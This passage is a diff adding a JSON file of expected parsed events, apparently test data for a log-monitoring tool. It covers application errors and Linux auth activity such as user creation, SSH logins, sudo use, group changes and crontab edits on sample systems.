@@ -1,0 +1,3418 @@
+{
+ "testdata/app/laravel.log": [
+  {
+   "source": "app",
+   "kind": "app_error",
+   "first_at": "2026-10-31T19:00:03Z",
+   "last_at": "2026-10-31T19:00:03Z",
+   "count": 1,
+   "message": "[2026-10-31 19:00:03] local.ERROR: Undefined variable  {\"exception\":\"[object] (ErrorException(code: 0): Undefined variable  at /app/t.php:12)\"} ",
+   "fields": {
+    "file": "/var/www/shop/storage/logs/laravel.log",
+    "level": "ERROR"
+   }
+  }
+ ],
+ "testdata/app/monolog.log": [
+  {
+   "source": "app",
+   "kind": "app_error",
+   "first_at": "2026-10-31T19:00:03.218272Z",
+   "last_at": "2026-10-31T19:00:03.218272Z",
+   "count": 1,
+   "message": "[2026-10-31T19:00:03.218272+00:00] production.ERROR: SQLSTATE[HY000] [2002] Connection refused {\"exception\":\"[object] (RuntimeException(code: 0): SQLSTATE[HY000] [2002] Connection refused at /app/t.php:8)",
+   "fields": {
+    "file": "/var/www/shop/storage/logs/laravel.log",
+    "level": "ERROR"
+   }
+  },
+  {
+   "source": "app",
+   "kind": "app_error",
+   "first_at": "2026-10-31T19:00:03.218297Z",
+   "last_at": "2026-10-31T19:00:03.218297Z",
+   "count": 1,
+   "message": "[2026-10-31T19:00:03.218297+00:00] production.CRITICAL: Payment gateway unreachable {\"gateway\":\"stripe\"} ",
+   "fields": {
+    "file": "/var/www/shop/storage/logs/laravel.log",
+    "level": "CRITICAL"
+   }
+  },
+  {
+   "source": "app",
+   "kind": "app_error",
+   "first_at": "2026-10-31T19:00:03.218308Z",
+   "last_at": "2026-10-31T19:00:03.218308Z",
+   "count": 1,
+   "message": "[2026-10-31T19:00:03.218308+00:00] production.EMERGENCY: Disk full  ",
+   "fields": {
+    "file": "/var/www/shop/storage/logs/laravel.log",
+    "level": "EMERGENCY"
+   }
+  }
+ ],
+ "testdata/auth/alpine-3.20.messages": [
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-10-31T19:01:03Z",
+   "last_at": "2026-10-31T19:01:03Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "alice",
+   "message": "new user: name=alice, UID=1000, GID=1000, home=/home/alice, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1000
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "password_changed",
+   "first_at": "2026-10-31T19:01:03Z",
+   "last_at": "2026-10-31T19:01:03Z",
+   "count": 1,
+   "program": "chpasswd",
+   "username": "alice",
+   "message": "pam_unix(chpasswd:chauthtok): password changed for alice"
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-10-31T19:01:03Z",
+   "last_at": "2026-10-31T19:01:03Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "bob",
+   "message": "new user: name=bob, UID=1001, GID=1001, home=/home/bob, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1001
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "password_changed",
+   "first_at": "2026-10-31T19:01:03Z",
+   "last_at": "2026-10-31T19:01:03Z",
+   "count": 1,
+   "program": "chpasswd",
+   "username": "bob",
+   "message": "pam_unix(chpasswd:chauthtok): password changed for bob"
+  },
+  {
+   "source": "auth",
+   "kind": "password_changed",
+   "first_at": "2026-10-31T19:01:03Z",
+   "last_at": "2026-10-31T19:01:03Z",
+   "count": 1,
+   "program": "chpasswd",
+   "username": "root",
+   "message": "pam_unix(chpasswd:chauthtok): password changed for root"
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_login_failed",
+   "first_at": "2026-10-31T19:01:03Z",
+   "last_at": "2026-10-31T19:01:03Z",
+   "count": 1,
+   "program": "sshd",
+   "src_ip": "127.0.0.1",
+   "username": "admin",
+   "message": "Failed password for invalid user admin from 127.0.0.1 port 44890 ssh2",
+   "fields": {
+    "invalid_user": true,
+    "method": "password",
+    "port": 44890
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_login_failed",
+   "first_at": "2026-10-31T19:01:04Z",
+   "last_at": "2026-10-31T19:01:04Z",
+   "count": 1,
+   "program": "sshd",
+   "src_ip": "127.0.0.1",
+   "username": "root",
+   "message": "Failed password for root from 127.0.0.1 port 44900 ssh2",
+   "fields": {
+    "invalid_user": false,
+    "method": "password",
+    "port": 44900
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_login_succeeded",
+   "first_at": "2026-10-31T19:01:04Z",
+   "last_at": "2026-10-31T19:01:04Z",
+   "count": 1,
+   "program": "sshd",
+   "src_ip": "127.0.0.1",
+   "username": "alice",
+   "message": "Accepted password for alice from 127.0.0.1 port 44906 ssh2",
+   "fields": {
+    "method": "password",
+    "port": 44906,
+    "session": "51"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T19:01:04Z",
+   "last_at": "2026-10-31T19:01:04Z",
+   "count": 1,
+   "program": "su",
+   "username": "root",
+   "message": "+ none root:alice",
+   "fields": {
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-10-31T19:01:04Z",
+   "last_at": "2026-10-31T19:01:04Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; COMMAND=/bin/ls [1 arg]",
+   "fields": {
+    "command": "/bin/ls [1 arg]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T19:01:04Z",
+   "last_at": "2026-10-31T19:01:04Z",
+   "count": 1,
+   "program": "su",
+   "username": "root",
+   "message": "+ none root:alice",
+   "fields": {
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-10-31T19:01:04Z",
+   "last_at": "2026-10-31T19:01:04Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; COMMAND=/bin/ls [1 arg]",
+   "fields": {
+    "command": "/bin/ls [1 arg]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T19:01:04Z",
+   "last_at": "2026-10-31T19:01:04Z",
+   "count": 1,
+   "program": "su",
+   "username": "root",
+   "message": "+ none root:bob",
+   "fields": {
+    "target_user": "bob"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_failed",
+   "first_at": "2026-10-31T19:01:04Z",
+   "last_at": "2026-10-31T19:01:04Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "bob",
+   "message": "     bob : user NOT in sudoers ; PWD=[redacted] ; USER=root ; COMMAND=/bin/ls [1 arg]",
+   "fields": {
+    "command": "/bin/ls [1 arg]",
+    "reason": "not_in_sudoers",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T19:01:04Z",
+   "last_at": "2026-10-31T19:01:04Z",
+   "count": 1,
+   "program": "su",
+   "username": "root",
+   "message": "+ none root:alice",
+   "fields": {
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T19:01:04Z",
+   "last_at": "2026-10-31T19:01:04Z",
+   "count": 1,
+   "program": "su",
+   "username": "root",
+   "message": "+ pts/0 root:root",
+   "fields": {
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-10-31T19:01:06Z",
+   "last_at": "2026-10-31T19:01:06Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "deploy",
+   "message": "new user: name=deploy, UID=1002, GID=1002, home=/home/deploy, shell=/bin/ash, from=none",
+   "fields": {
+    "uid": 1002
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-10-31T19:01:06Z",
+   "last_at": "2026-10-31T19:01:06Z",
+   "count": 1,
+   "program": "usermod",
+   "username": "deploy",
+   "message": "add 'deploy' to group 'wheel'",
+   "fields": {
+    "action": "add",
+    "group": "wheel"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-10-31T19:01:06Z",
+   "last_at": "2026-10-31T19:01:06Z",
+   "count": 1,
+   "program": "gpasswd",
+   "username": "deploy",
+   "message": "user deploy added by root to group adm",
+   "fields": {
+    "action": "add",
+    "group": "adm"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-10-31T19:01:06Z",
+   "last_at": "2026-10-31T19:01:06Z",
+   "count": 1,
+   "program": "gpasswd",
+   "username": "deploy",
+   "message": "user deploy removed by root from group adm",
+   "fields": {
+    "action": "remove",
+    "group": "adm"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "password_changed",
+   "first_at": "2026-10-31T19:01:06Z",
+   "last_at": "2026-10-31T19:01:06Z",
+   "count": 1,
+   "program": "chpasswd",
+   "username": "deploy",
+   "message": "pam_unix(chpasswd:chauthtok): password changed for deploy"
+  }
+ ],
+ "testdata/auth/alpine-3.22.sessions.log": [
+  {
+   "source": "auth",
+   "kind": "ssh_login_succeeded",
+   "first_at": "2025-11-09T13:14:55Z",
+   "last_at": "2025-11-09T13:14:55Z",
+   "count": 1,
+   "program": "sshd-session.pam",
+   "src_ip": "127.0.0.1",
+   "username": "root",
+   "message": "Accepted publickey for root from 127.0.0.1 port 47180 ssh2: ED25519 SHA256:Kuddh+21bZ3c8vfXMZqvCPQpjT67/JJtrylCG1ztbG8",
+   "fields": {
+    "method": "publickey",
+    "port": 47180,
+    "session": "21"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_session_opened",
+   "first_at": "2025-11-09T13:14:55Z",
+   "last_at": "2025-11-09T13:14:55Z",
+   "count": 1,
+   "program": "sshd-session.pam",
+   "username": "root",
+   "message": "pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)",
+   "fields": {
+    "session": "21"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2025-11-09T13:14:55Z",
+   "last_at": "2025-11-09T13:14:55Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "root",
+   "message": "    root : TTY=pts/0 ; PWD=[redacted] ; USER=root ; COMMAND=/usr/bin/id [0 args]",
+   "fields": {
+    "command": "/usr/bin/id [0 args]",
+    "target_user": "root",
+    "tty": "pts/0"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_session_closed",
+   "first_at": "2025-11-09T13:14:55Z",
+   "last_at": "2025-11-09T13:14:55Z",
+   "count": 1,
+   "program": "sshd-session.pam",
+   "username": "root",
+   "message": "pam_unix(sshd:session): session closed for user root",
+   "fields": {
+    "session": "21"
+   }
+  }
+ ],
+ "testdata/auth/debian-12.auth.log": [
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-10-31T19:01:51.804917Z",
+   "last_at": "2026-10-31T19:01:51.804917Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "alice",
+   "message": "new user: name=alice, UID=1000, GID=1000, home=/home/alice, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1000
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "password_changed",
+   "first_at": "2026-10-31T19:01:51.880513Z",
+   "last_at": "2026-10-31T19:01:51.880513Z",
+   "count": 1,
+   "program": "chpasswd",
+   "username": "alice",
+   "message": "pam_unix(chpasswd:chauthtok): password changed for alice"
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-10-31T19:01:51.901912Z",
+   "last_at": "2026-10-31T19:01:51.901912Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "bob",
+   "message": "new user: name=bob, UID=1001, GID=1001, home=/home/bob, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1001
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "password_changed",
+   "first_at": "2026-10-31T19:01:51.978563Z",
+   "last_at": "2026-10-31T19:01:51.978563Z",
+   "count": 1,
+   "program": "chpasswd",
+   "username": "bob",
+   "message": "pam_unix(chpasswd:chauthtok): password changed for bob"
+  },
+  {
+   "source": "auth",
+   "kind": "password_changed",
+   "first_at": "2026-10-31T19:01:51.999539Z",
+   "last_at": "2026-10-31T19:01:51.999539Z",
+   "count": 1,
+   "program": "chpasswd",
+   "username": "root",
+   "message": "pam_unix(chpasswd:chauthtok): password changed for root"
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-10-31T19:01:52.031585Z",
+   "last_at": "2026-10-31T19:01:52.031585Z",
+   "count": 1,
+   "program": "usermod",
+   "username": "alice",
+   "message": "add 'alice' to group 'sudo'",
+   "fields": {
+    "action": "add",
+    "group": "sudo"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_login_failed",
+   "first_at": "2026-10-31T19:01:53.94567Z",
+   "last_at": "2026-10-31T19:01:53.94567Z",
+   "count": 1,
+   "program": "sshd",
+   "src_ip": "127.0.0.1",
+   "username": "admin",
+   "message": "Failed password for invalid user admin from 127.0.0.1 port 60580 ssh2",
+   "fields": {
+    "invalid_user": true,
+    "method": "password",
+    "port": 60580
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_login_failed",
+   "first_at": "2026-10-31T19:01:56.573943Z",
+   "last_at": "2026-10-31T19:01:56.573943Z",
+   "count": 1,
+   "program": "sshd",
+   "src_ip": "127.0.0.1",
+   "username": "root",
+   "message": "Failed password for root from 127.0.0.1 port 47292 ssh2",
+   "fields": {
+    "invalid_user": false,
+    "method": "password",
+    "port": 47292
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_login_succeeded",
+   "first_at": "2026-10-31T19:01:58.679553Z",
+   "last_at": "2026-10-31T19:01:58.679553Z",
+   "count": 1,
+   "program": "sshd",
+   "src_ip": "127.0.0.1",
+   "username": "alice",
+   "message": "Accepted password for alice from 127.0.0.1 port 47298 ssh2",
+   "fields": {
+    "method": "password",
+    "port": 47298,
+    "session": "4400"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_session_opened",
+   "first_at": "2026-10-31T19:01:58.680419Z",
+   "last_at": "2026-10-31T19:01:58.680419Z",
+   "count": 1,
+   "program": "sshd",
+   "username": "alice",
+   "message": "pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)",
+   "fields": {
+    "session": "4400"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "ssh_session_closed",
+   "first_at": "2026-10-31T19:01:58.726815Z",
+   "last_at": "2026-10-31T19:01:58.726815Z",
+   "count": 1,
+   "program": "sshd",
+   "username": "alice",
+   "message": "pam_unix(sshd:session): session closed for user alice",
+   "fields": {
+    "session": "4400"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T19:01:58.728526Z",
+   "last_at": "2026-10-31T19:01:58.728526Z",
+   "count": 1,
+   "program": "su",
+   "message": "pam_unix(su:session): session opened for user alice(uid=1000) by (uid=0)",
+   "fields": {
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-10-31T19:01:58.755316Z",
+   "last_at": "2026-10-31T19:01:58.755316Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; COMMAND=/usr/bin/ls [1 arg]",
+   "fields": {
+    "command": "/usr/bin/ls [1 arg]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T19:01:58.758509Z",
+   "last_at": "2026-10-31T19:01:58.758509Z",
+   "count": 1,
+   "program": "su",
+   "message": "pam_unix(su:session): session opened for user alice(uid=1000) by (uid=0)",
+   "fields": {
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_failed",
+   "first_at": "2026-10-31T19:02:00.677363Z",
+   "last_at": "2026-10-31T19:02:00.677363Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : 1 incorrect password attempt ; PWD=[redacted] ; USER=root ; COMMAND=/usr/bin/ls [1 arg]",
+   "fields": {
+    "command": "/usr/bin/ls [1 arg]",
+    "reason": "incorrect_password",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T19:02:00.683877Z",
+   "last_at": "2026-10-31T19:02:00.683877Z",
+   "count": 1,
+   "program": "su",
+   "message": "pam_unix(su:session): session opened for user bob(uid=1001) by (uid=0)",
+   "fields": {
+    "target_user": "bob"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_failed",
+   "first_at": "2026-10-31T19:02:00.7226Z",
+   "last_at": "2026-10-31T19:02:00.7226Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "bob",
+   "message": "     bob : user NOT in sudoers ; PWD=[redacted] ; USER=root ; COMMAND=/usr/bin/ls [1 arg]",
+   "fields": {
+    "command": "/usr/bin/ls [1 arg]",
+    "reason": "not_in_sudoers",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T19:02:00.724613Z",
+   "last_at": "2026-10-31T19:02:00.724613Z",
+   "count": 1,
+   "program": "su",
+   "message": "pam_unix(su:session): session opened for user alice(uid=1000) by (uid=0)",
+   "fields": {
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "su_session",
+   "first_at": "2026-10-31T19:02:00.72691Z",
+   "last_at": "2026-10-31T19:02:00.72691Z",
+   "count": 1,
+   "program": "su",
+   "message": "pam_unix(su:session): session opened for user alice(uid=1000) by (uid=0)",
+   "fields": {
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-10-31T19:02:02.030623Z",
+   "last_at": "2026-10-31T19:02:02.030623Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "deploy",
+   "message": "new user: name=deploy, UID=1002, GID=1002, home=/home/deploy, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1002
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-10-31T19:02:02.090434Z",
+   "last_at": "2026-10-31T19:02:02.090434Z",
+   "count": 1,
+   "program": "usermod",
+   "username": "deploy",
+   "message": "add 'deploy' to group 'sudo'",
+   "fields": {
+    "action": "add",
+    "group": "sudo"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-10-31T19:02:02.131298Z",
+   "last_at": "2026-10-31T19:02:02.131298Z",
+   "count": 1,
+   "program": "gpasswd",
+   "username": "deploy",
+   "message": "user deploy added by root to group adm",
+   "fields": {
+    "action": "add",
+    "group": "adm"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-10-31T19:02:02.156257Z",
+   "last_at": "2026-10-31T19:02:02.156257Z",
+   "count": 1,
+   "program": "gpasswd",
+   "username": "deploy",
+   "message": "user deploy removed by root from group adm",
+   "fields": {
+    "action": "remove",
+    "group": "adm"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "password_changed",
+   "first_at": "2026-10-31T19:02:02.189008Z",
+   "last_at": "2026-10-31T19:02:02.189008Z",
+   "count": 1,
+   "program": "chpasswd",
+   "username": "deploy",
+   "message": "pam_unix(chpasswd:chauthtok): password changed for deploy"
+  }
+ ],
+ "testdata/auth/debian-12.cron.log": [
+  {
+   "source": "auth",
+   "kind": "cron_modified",
+   "first_at": "2026-11-02T08:06:03.309024Z",
+   "last_at": "2026-11-02T08:06:03.309024Z",
+   "count": 1,
+   "program": "crontab",
+   "username": "root",
+   "message": "(root) REPLACE (alice)",
+   "fields": {
+    "action": "replace",
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "cron_modified",
+   "first_at": "2026-11-02T08:06:05.417482Z",
+   "last_at": "2026-11-02T08:06:05.417482Z",
+   "count": 1,
+   "program": "crontab",
+   "username": "root",
+   "message": "(root) REPLACE (alice)",
+   "fields": {
+    "action": "replace",
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "cron_modified",
+   "first_at": "2026-11-02T08:06:07.420629Z",
+   "last_at": "2026-11-02T08:06:07.420629Z",
+   "count": 1,
+   "program": "crontab",
+   "username": "root",
+   "message": "(root) DELETE (alice)",
+   "fields": {
+    "action": "delete",
+    "target_user": "alice"
+   }
+  }
+ ],
+ "testdata/auth/debian-12.groups.log": [
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-11-02T11:33:48.124621Z",
+   "last_at": "2026-11-02T11:33:48.124621Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "alice",
+   "message": "new user: name=alice, UID=1000, GID=1000, home=/home/alice, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1000
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-11-02T11:33:48.197654Z",
+   "last_at": "2026-11-02T11:33:48.197654Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "mallory",
+   "message": "new user: name=mallory, UID=1001, GID=1001, home=/home/mallory, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1001
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-11-02T11:33:48.197838Z",
+   "last_at": "2026-11-02T11:33:48.197838Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "mallory",
+   "message": "add 'mallory' to group 'adm'",
+   "fields": {
+    "action": "add",
+    "group": "adm"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-11-02T11:33:48.197865Z",
+   "last_at": "2026-11-02T11:33:48.197865Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "mallory",
+   "message": "add 'mallory' to group 'sudo'",
+   "fields": {
+    "action": "add",
+    "group": "sudo"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2026-11-02T11:33:48.271735Z",
+   "last_at": "2026-11-02T11:33:48.271735Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "trudy",
+   "message": "new user: name=trudy, UID=1002, GID=1002, home=/home/trudy, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1002
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-11-02T11:33:48.271919Z",
+   "last_at": "2026-11-02T11:33:48.271919Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "trudy",
+   "message": "add 'trudy' to group 'sudo'",
+   "fields": {
+    "action": "add",
+    "group": "sudo"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-11-02T11:33:48.329518Z",
+   "last_at": "2026-11-02T11:33:48.329518Z",
+   "count": 1,
+   "program": "usermod",
+   "username": "mallory",
+   "message": "delete 'mallory' from group 'sudo'",
+   "fields": {
+    "action": "remove",
+    "group": "sudo"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2026-11-02T11:33:48.396628Z",
+   "last_at": "2026-11-02T11:33:48.396628Z",
+   "count": 1,
+   "program": "usermod",
+   "username": "alice",
+   "message": "add 'alice' to group 'sudo'",
+   "fields": {
+    "action": "add",
+    "group": "sudo"
+   }
+  }
+ ],
+ "testdata/auth/debian-12.sudo-continued.log": [
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-02T22:15:25.640654Z",
+   "last_at": "2026-11-02T22:15:25.640654Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; COMMAND=/bin/true [130 args]",
+   "fields": {
+    "command": "/bin/true [130 args]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-02T22:15:25.644932Z",
+   "last_at": "2026-11-02T22:15:25.644932Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; COMMAND=/bin/true [130 args]",
+   "fields": {
+    "command": "/bin/true [130 args]",
+    "target_user": "root"
+   }
+  }
+ ],
+ "testdata/auth/debian-12.sudo.log": [
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-02T11:33:48.4273Z",
+   "last_at": "2026-11-02T11:33:48.4273Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; COMMAND=/bin/ls [1 arg]",
+   "fields": {
+    "command": "/bin/ls [1 arg]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-02T11:33:48.446383Z",
+   "last_at": "2026-11-02T11:33:48.446383Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=bob ; COMMAND=[unparsed]",
+   "fields": {
+    "command": "[unparsed]"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-02T11:33:48.464754Z",
+   "last_at": "2026-11-02T11:33:48.464754Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; COMMAND=[unparsed]",
+   "fields": {
+    "command": "[unparsed]"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-02T11:33:48.483008Z",
+   "last_at": "2026-11-02T11:33:48.483008Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; COMMAND=[unparsed]",
+   "fields": {
+    "command": "[unparsed]"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-02T11:33:48.501057Z",
+   "last_at": "2026-11-02T11:33:48.501057Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=bob ; COMMAND=[unparsed]",
+   "fields": {
+    "command": "[unparsed]"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-02T11:33:48.519808Z",
+   "last_at": "2026-11-02T11:33:48.519808Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; ENV=[redacted] ; COMMAND=[unparsed]",
+   "fields": {
+    "command": "[unparsed]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-02T11:33:48.538242Z",
+   "last_at": "2026-11-02T11:33:48.538242Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; GROUP=adm ; COMMAND=/bin/sh [2 args]",
+   "fields": {
+    "command": "/bin/sh [2 args]",
+    "target_user": "root"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "sudo_command",
+   "first_at": "2026-11-02T11:33:48.546709Z",
+   "last_at": "2026-11-02T11:33:48.546709Z",
+   "count": 1,
+   "program": "sudo",
+   "username": "alice",
+   "message": "   alice : PWD=[redacted] ; USER=root ; TSID=01 ; COMMAND=/usr/bin/id [0 args]",
+   "fields": {
+    "command": "/usr/bin/id [0 args]",
+    "target_user": "root",
+    "tsid": "01"
+   }
+  }
+ ],
+ "testdata/auth/rocky-9.cron": [
+  {
+   "source": "auth",
+   "kind": "cron_modified",
+   "first_at": "2025-11-02T08:07:08Z",
+   "last_at": "2025-11-02T08:07:08Z",
+   "count": 1,
+   "program": "crontab",
+   "username": "root",
+   "message": "(root) REPLACE (alice)",
+   "fields": {
+    "action": "replace",
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "cron_modified",
+   "first_at": "2025-11-02T08:07:10Z",
+   "last_at": "2025-11-02T08:07:10Z",
+   "count": 1,
+   "program": "crontab",
+   "username": "root",
+   "message": "(root) REPLACE (alice)",
+   "fields": {
+    "action": "replace",
+    "target_user": "alice"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "cron_modified",
+   "first_at": "2025-11-02T08:07:12Z",
+   "last_at": "2025-11-02T08:07:12Z",
+   "count": 1,
+   "program": "crontab",
+   "username": "root",
+   "message": "(root) DELETE (alice)",
+   "fields": {
+    "action": "delete",
+    "target_user": "alice"
+   }
+  }
+ ],
+ "testdata/auth/rocky-9.groups.secure": [
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2025-11-02T11:34:34Z",
+   "last_at": "2025-11-02T11:34:34Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "alice",
+   "message": "new user: name=alice, UID=1000, GID=1000, home=/home/alice, shell=/bin/sh, from=none",
+   "fields": {
+    "uid": 1000
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_created",
+   "first_at": "2025-11-02T11:34:34Z",
+   "last_at": "2025-11-02T11:34:34Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "mallory",
+   "message": "new user: name=mallory, UID=1001, GID=1001, home=/home/mallory, shell=/bin/bash, from=none",
+   "fields": {
+    "uid": 1001
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2025-11-02T11:34:34Z",
+   "last_at": "2025-11-02T11:34:34Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "mallory",
+   "message": "add 'mallory' to group 'adm'",
+   "fields": {
+    "action": "add",
+    "group": "adm"
+   }
+  },
+  {
+   "source": "auth",
+   "kind": "user_group_changed",
+   "first_at": "2025-11-02T11:34:34Z",
+   "last_at": "2025-11-02T11:34:34Z",
+   "count": 1,
+   "program": "useradd",
+   "username": "mallory",
